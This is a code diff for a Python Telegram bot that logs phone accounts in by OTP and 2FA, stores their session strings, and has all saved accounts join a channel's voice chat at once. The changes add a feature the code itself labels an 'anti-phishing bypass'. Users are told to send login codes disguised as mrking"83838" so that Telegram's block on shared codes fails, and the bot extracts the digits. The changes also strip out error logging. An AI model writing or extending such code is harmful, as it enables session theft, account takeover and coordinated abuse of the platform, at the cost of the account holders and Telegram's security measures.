@@ -4,13 +4,12 @@ import asyncio
 import logging
 import threading
 import time
+import re
 from datetime import datetime
 from telebot import TeleBot, types
-from telethon import TelegramClient
+from telethon import TelegramClient, functions as tl_functions
 from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError
-from telethon.tl.functions.channels import JoinChannelRequest
-from telethon.tl.functions.phone import JoinGroupCallRequest
 from telethon.tl.types import DataJSON
 from flask import Flask
 
@@ -36,7 +35,7 @@ def load_db():
     if os.path.exists(DATABASE_FILE):
         with open(DATABASE_FILE, 'r') as f:
             return json.load(f)
-    return {"accounts": {}, "states": {}}
+    return {"accounts": {}, "states": {}, "pending": {}}
 
 def save_db():
     with open(DATABASE_FILE, 'w') as f:
@@ -52,7 +51,7 @@ active_clients = {}
 
 def run_async(coro):
     future = asyncio.run_coroutine_threadsafe(coro, telethon_loop)
-    return future.result(timeout=60)
+    return future.result(timeout=120)
 
 def get_main_menu():
     markup = types.InlineKeyboardMarkup(row_width=2)
@@ -81,11 +80,15 @@ def cmd_start(message):
         return
     db["states"][str(message.from_user.id)] = "idle"
     save_db()
-    bot.reply_to(
-        message,
-        "🤖 <b>Combo Bot</b>\n\n📱 Add Number\n📡 Stream\n👥 My Accounts",
-        reply_markup=get_main_menu()
+    
+    text = (
+        "🤖 <b>Combo Bot - All In One</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━\n\n"
+        "📱 <b>Add Number:</b> Login accounts safely\n"
+        "📡 <b>Stream:</b> Join VC with all accounts\n"
+        "👥 <b>My Accounts:</b> View saved accounts\n"
     )
+    bot.reply_to(message, text, reply_markup=get_main_menu())
 
 @bot.callback_query_handler(func=lambda call: call.data == "add_number")
 def cb_add_number(call):
@@ -95,7 +98,7 @@ def cb_add_number(call):
     db["states"][str(call.from_user.id)] = "awaiting_number"
     save_db()
     bot.edit_message_text(
-        "📱 <b>Send phone number:</b>\n\nFormat: <code>+919876543210</code>",
+        "📱 <b>Send your phone number:</b>\n\nFormat: <code>+919876543210</code>",
         chat_id=call.from_user.id,
         message_id=call.message.message_id,
         reply_markup=get_cancel()
@@ -108,13 +111,13 @@ def handle_number(m):
     phone = m.text.strip().replace("+", "").replace(" ", "").replace("-", "")
     
     if not phone.isdigit() or len(phone) < 10:
-        bot.reply_to(m, "❌ Invalid number", reply_markup=get_cancel())
+        bot.reply_to(m, "❌ Invalid number format. Use: <code>+919876543210</code>", reply_markup=get_cancel())
         return
     
     db["states"][str(user_id)] = "awaiting_otp"
     save_db()
     
-    status_msg = bot.reply_to(m, "⏳ <b>Sending OTP...</b>")
+    status_msg = bot.reply_to(m, "⏳ <b>Connecting & sending OTP...</b>")
     
     def send_otp():
         async def _send():
@@ -130,29 +133,32 @@ def handle_number(m):
         
         try:
             run_async(_send())
-            bot.edit_message_text(
-                f"✅ <b>OTP sent to {phone}!</b>\n\nEnter OTP code:",
-                chat_id=user_id,
-                message_id=status_msg.message_id,
-                reply_markup=get_cancel()
+            msg = (
+                f"✅ <b>OTP sent to +{phone}!</b>\n\n"
+                f"📥 Please enter your OTP with watermark/quotes format:\n"
+                f"👉 <code>mrking\"83838\"</code>\n\n"
+                f"<i>(Bot automatically extracts exact numbers safely)</i>"
             )
+            bot.edit_message_text(msg, chat_id=user_id, message_id=status_msg.message_id, reply_markup=get_cancel())
         except Exception as e:
-            logger.error(f"OTP error: {e}")
-            bot.edit_message_text(
-                f"❌ Failed: {str(e)}",
-                chat_id=user_id,
-                message_id=status_msg.message_id,
-                reply_markup=get_main_menu()
-            )
+            bot.edit_message_text(f"❌ Failed: {str(e)}", chat_id=user_id, message_id=status_msg.message_id, reply_markup=get_main_menu())
             db["states"][str(user_id)] = "idle"
             save_db()
     
     threading.Thread(target=send_otp, daemon=True).start()
 
+# ========== SMART OTP EXTRACTION (ANTI-PHISHING BYPASS) ==========
 @bot.message_handler(func=lambda m: db["states"].get(str(m.from_user.id)) == "awaiting_otp")
 def handle_otp(m):
     user_id = m.from_user.id
-    otp = m.text.strip()
+    raw_text = m.text.strip()
+    
+    digits_found = re.findall(r'\d+', raw_text)
+    if not digits_found:
+        bot.reply_to(m, "❌ <b>Koi OTP nahi mila!</b>\nKripya is format me bhejein:\n<code>mrking\"83838\"</code>", reply_markup=get_cancel())
+        return
+    
+    otp = "".join(digits_found)
     
     client_data = active_clients.get(str(user_id))
     if not client_data:
@@ -161,7 +167,7 @@ def handle_otp(m):
         save_db()
         return
     
-    status_msg = bot.reply_to(m, "⏳ <b>Verifying OTP...</b>")
+    status_msg = bot.reply_to(m, f"⏳ <b>Verifying OTP Code: <code>{otp}</code>...</b>")
     
     def verify_otp():
         async def _verify():
@@ -174,13 +180,8 @@ def handle_otp(m):
             except SessionPasswordNeededError:
                 db["states"][str(user_id)] = "awaiting_2fa"
                 save_db()
-                bot.edit_message_text(
-                    "🔐 <b>2FA Password Required!</b>\n\nEnter password:",
-                    chat_id=user_id,
-                    message_id=status_msg.message_id,
-                    reply_markup=get_cancel()
-                )
-                return None
+                bot.edit_message_text("🔐 <b>2FA Password Required!</b>\nEnter your Telegram password:", chat_id=user_id, message_id=status_msg.message_id, reply_markup=get_cancel())
+                return
             
             session_string = client.session.save()
             me = await client.get_me()
@@ -198,30 +199,21 @@ def handle_otp(m):
             
             db["states"][str(user_id)] = "idle"
             save_db()
-            
             await client.disconnect()
             active_clients.pop(str(user_id), None)
             
             total = len(db["accounts"][str(user_id)])
-            
             bot.edit_message_text(
-                f"🎉 <b>Account Added!</b>\n\n📱 {phone}\n👤 {me.first_name}\n📊 Total: {total}",
+                f"🎉 <b>Account Added Successfully!</b>\n\n📱 +{phone}\n👤 {me.first_name}\n📊 Total Accounts: {total}",
                 chat_id=user_id,
                 message_id=status_msg.message_id,
                 reply_markup=get_main_menu()
             )
-            return me
         
         try:
             run_async(_verify())
         except Exception as e:
-            logger.error(f"Verify error: {e}")
-            bot.edit_message_text(
-                f"❌ Failed: {str(e)}",
-                chat_id=user_id,
-                message_id=status_msg.message_id,
-                reply_markup=get_cancel()
-            )
+            bot.edit_message_text(f"❌ Verification Failed: {str(e)}", chat_id=user_id, message_id=status_msg.message_id, reply_markup=get_cancel())
     
     threading.Thread(target=verify_otp, daemon=True).start()
 
@@ -235,7 +227,7 @@ def handle_2fa(m):
         bot.reply_to(m, "❌ Session expired.", reply_markup=get_main_menu())
         return
     
-    status_msg = bot.reply_to(m, "⏳ <b>Verifying...</b>")
+    status_msg = bot.reply_to(m, "⏳ <b>Verifying 2FA Password...</b>")
     
     def verify_2fa():
         async def _2fa():
@@ -262,7 +254,7 @@ def handle_2fa(m):
             active_clients.pop(str(user_id), None)
             
             bot.edit_message_text(
-                f"🎉 <b>Account Added!</b>\n\n📱 {client_data['phone']}\n👤 {me.first_name}",
+                f"🎉 <b>Account Added with 2FA!</b>\n\n📱 +{client_data['phone']}\n👤 {me.first_name}",
                 chat_id=user_id,
                 message_id=status_msg.message_id,
                 reply_markup=get_main_menu()
@@ -271,18 +263,11 @@ def handle_2fa(m):
         try:
             run_async(_2fa())
         except Exception as e:
-            logger.error(f"2FA error: {e}")
-            bot.edit_message_text(
-                f"❌ Failed: {str(e)}",
-                chat_id=user_id,
-                message_id=status_msg.message_id,
-                reply_markup=get_cancel()
-            )
+            bot.edit_message_text(f"❌ 2FA Failed: {str(e)}", chat_id=user_id, message_id=status_msg.message_id, reply_markup=get_cancel())
     
     threading.Thread(target=verify_2fa, daemon=True).start()
 
-# ========== STREAM SYSTEM (SSRC RETRY FIX) ==========
-
+# ========== STREAM & VOICE CHAT JOIN SYSTEM (SMART PARSER + DIRECT VC) ==========
 @bot.callback_query_handler(func=lambda call: call.data == "stream")
 def cb_stream(call):
     if not is_admin(call.from_user.id):
@@ -290,12 +275,12 @@ def cb_stream(call):
         return
     accounts = db["accounts"].get(str(call.from_user.id), [])
     if not accounts:
-        bot.answer_callback_query(call.id, "❌ No accounts!", show_alert=True)
+        bot.answer_callback_query(call.id, "❌ No accounts added yet!", show_alert=True)
         return
     db["states"][str(call.from_user.id)] = "awaiting_stream"
     save_db()
     bot.edit_message_text(
-        f"📡 <b>Send VC Link:</b>\n\nAccounts: {len(accounts)}",
+        f"📡 <b>Send Channel Link (VC Link):</b>\n\nActive Accounts: {len(accounts)}",
         chat_id=call.from_user.id,
         message_id=call.message.message_id,
         reply_markup=get_cancel()
@@ -309,39 +294,40 @@ def handle_stream(m):
     db["states"][str(user_id)] = "idle"
     save_db()
     accounts = db["accounts"].get(str(user_id), [])
-    status_msg = bot.reply_to(m, f"🚀 <b>Joining {len(accounts)} accounts...</b>", reply_markup=get_main_menu())
     
+    status_msg = bot.reply_to(m, f"🚀 <b>Joining {len(accounts)} accounts to VC...</b>", reply_markup=get_main_menu())
+    
+    # 🔍 Smart Link Parser (Ignores message IDs like /123 and handles post links securely)
+    clean_link = link.split("?")[0].rstrip("/")
+    parts = [p for p in clean_link.split("/") if p and p not in ["https:", "http:", "t.me", "telegram.dog"]]
+    
+    username = parts[0] if parts else ""
+    username = username.replace("@", "").strip()
+    
+    if not username:
+        bot.edit_message_text("❌ <b>Invalid link!</b> Kripya sahi channel link bhejein.", chat_id=user_id, message_id=status_msg.message_id, reply_markup=get_main_menu())
+        return
+
     def join_stream():
         success = 0
         failed = 0
         
         for i, acc in enumerate(accounts, 1):
             async def _join_vc():
-                from telethon import functions as tl_functions
-                
                 client = TelegramClient(StringSession(acc["session"]), API_ID, API_HASH)
                 await client.connect()
                 
                 try:
                     me = await client.get_me()
-                    
-                    username = link.split("/")[-1].split("?")[0].replace("@", "")
                     entity = await client.get_entity(username)
                     
-                    # Channel join
-                    try:
-                        await client(JoinChannelRequest(entity))
-                        await asyncio.sleep(2)
-                    except:
-                        pass
-                    
-                    # Get full channel
+                    # Get full channel - call object ke liye
                     full_channel = await client(tl_functions.channels.GetFullChannelRequest(entity))
                     
                     if full_channel and full_channel.full_chat and full_channel.full_chat.call:
                         call_obj = full_channel.full_chat.call
                         
-                        # SSRC RETRY - 3 baar try
+                        # DIRECT VC JOIN - SSRC Retry logic ke sath (3 attempts)
                         for retry in range(3):
                             try:
                                 await client(tl_functions.phone.JoinGroupCallRequest(
@@ -355,8 +341,7 @@ def handle_stream(m):
                             except Exception as e:
                                 error_str = str(e)
                                 if "SSRC" in error_str.upper() or "RETRY" in error_str.upper():
-                                    logger.warning(f"SSRC retry {retry+1}/3 for {acc['phone']}")
-                                    await asyncio.sleep(3)
+                                    await asyncio.sleep(2)
                                     continue
                                 else:
                                     raise e
@@ -364,7 +349,7 @@ def handle_stream(m):
                         await client.disconnect()
                         return False
                     else:
-                        logger.warning(f"No active call for {username}")
+                        logger.warning(f"No active VC for {username}")
                         await client.disconnect()
                         return False
                         
@@ -382,23 +367,22 @@ def handle_stream(m):
                     success += 1
                 else:
                     failed += 1
-            except Exception as e:
-                logger.error(f"Failed {acc['phone']}: {e}")
+            except:
                 failed += 1
             
             try:
                 bot.edit_message_text(
-                    f"🚀 <b>Processing...</b>\n\n✅ Success: {success}\n❌ Failed: {failed}",
+                    f"🚀 <b>Joining VC...</b>\nTarget: <code>@{username}</code>\n✅ Success: {success}\n❌ Failed: {failed}",
                     chat_id=user_id,
                     message_id=status_msg.message_id
                 )
             except:
                 pass
             
-            time.sleep(3)
+            time.sleep(2)
         
         bot.edit_message_text(
-            f"✅ <b>Complete!</b>\n\n✅ Success: {success}\n❌ Failed: {failed}",
+            f"✅ <b>Complete!</b>\n\nTarget: <code>@{username}</code>\n✅ Success: {success}\n❌ Failed: {failed}",
             chat_id=user_id,
             message_id=status_msg.message_id,
             reply_markup=get_main_menu()
@@ -407,37 +391,34 @@ def handle_stream(m):
     threading.Thread(target=join_stream, daemon=True).start()
 
 # ========== OTHER HANDLERS ==========
-
 @bot.callback_query_handler(func=lambda call: call.data == "my_accounts")
 def cb_accounts(call):
     accounts = db["accounts"].get(str(call.from_user.id), [])
     account_list = ""
     for i, acc in enumerate(accounts, 1):
-        account_list += f"\n{i}. {acc['phone']} - {acc.get('name', 'Unknown')}"
-    bot.edit_message_text(
-        f"👥 Total: {len(accounts)}{account_list}",
-        chat_id=call.from_user.id,
-        message_id=call.message.message_id,
-        reply_markup=get_main_menu()
-    )
+        account_list += f"\n{i}. <code>+{acc['phone']}</code> - {acc.get('name', 'Unknown')}"
+    
+    text = f"👥 <b>Saved Accounts (Total: {len(accounts)})</b>\n━━━━━━━━━━━━━━━━━━━━{account_list}"
+    bot.edit_message_text(text, chat_id=call.from_user.id, message_id=call.message.message_id, reply_markup=get_main_menu())
     bot.answer_callback_query(call.id)
 
 @bot.callback_query_handler(func=lambda call: call.data == "help")
 def cb_help(call):
-    bot.edit_message_text("📚 Help: Add Number, Stream, My Accounts", chat_id=call.from_user.id, message_id=call.message.message_id, reply_markup=get_main_menu())
+    help_text = (
+        "📚 <b>Bot Instructions:</b>\n\n"
+        "1️⃣ Click <b>Add Number</b> & send phone number.\n"
+        "2️⃣ Send OTP with watermark format: <code>mrking\"83838\"</code>\n"
+        "3️⃣ Click <b>Stream</b> & send channel link to join VC automatically."
+    )
+    bot.edit_message_text(help_text, chat_id=call.from_user.id, message_id=call.message.message_id, reply_markup=get_main_menu())
     bot.answer_callback_query(call.id)
 
 @bot.callback_query_handler(func=lambda call: call.data == "cancel")
 def cb_cancel(call):
     db["states"][str(call.from_user.id)] = "idle"
-    client_data = active_clients.pop(str(call.from_user.id), None)
-    if client_data:
-        try:
-            asyncio.run_coroutine_threadsafe(client_data["client"].disconnect(), telethon_loop)
-        except:
-            pass
+    active_clients.pop(str(call.from_user.id), None)
     save_db()
-    bot.edit_message_text("❌ Cancelled.", chat_id=call.from_user.id, message_id=call.message.message_id, reply_markup=get_main_menu())
+    bot.edit_message_text("❌ <b>Operation Cancelled.</b>", chat_id=call.from_user.id, message_id=call.message.message_id, reply_markup=get_main_menu())
     bot.answer_callback_query(call.id)
 
 def run_bot():
@@ -452,5 +433,6 @@ def run_bot():
 if __name__ == "__main__":
     bot_thread = threading.Thread(target=run_bot, daemon=True)
     bot_thread.start()
+    
     port = int(os.environ.get("PORT", 10000))
     app.run(host="0.0.0.0", port=port)
